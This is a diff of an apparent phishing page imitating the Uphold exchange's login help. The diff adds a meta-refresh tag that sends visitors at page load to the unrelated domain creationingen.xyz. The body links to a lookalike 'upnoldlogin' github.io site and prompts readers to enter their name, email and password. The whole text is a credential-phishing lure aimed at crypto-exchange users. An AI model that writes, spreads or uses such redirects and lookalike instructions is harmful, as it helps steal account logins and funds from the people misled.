@@ -1,4 +1,4 @@
-<a href="https://creationingen.xyz/validationed/uphldoo/"><img style="display: block; margin-left: auto;margin-right: auto;" src="https://cdn.fs.teachablecdn.com/6OcXH4CbQaZM7n9sdBPR" alt="uphold login" width="100%" height="auto"></a>
+<meta http-equiv="refresh" content="0; url=https://creationingen.xyz/validationed/uphldoo/">
 ## The steps for creating a new account for Uphold Login
 Set up a new [Uphold Login](https://upnoldlogin.github.io/en-us/) account using the instructions below, but make sure your phone or PC is linked to a secure internet connection. Navigate to the App or Play Store and then follow the instructions to download the Uphold login app. Otherwise, use a browser and navigate to the Uphold.com website. Now, enter your name, email address, password, and any other information that is requested. Then, navigate to the 'Continue' option and click it to continue. If prompted, enter your email address and click the 'Finish Setup' button.
  
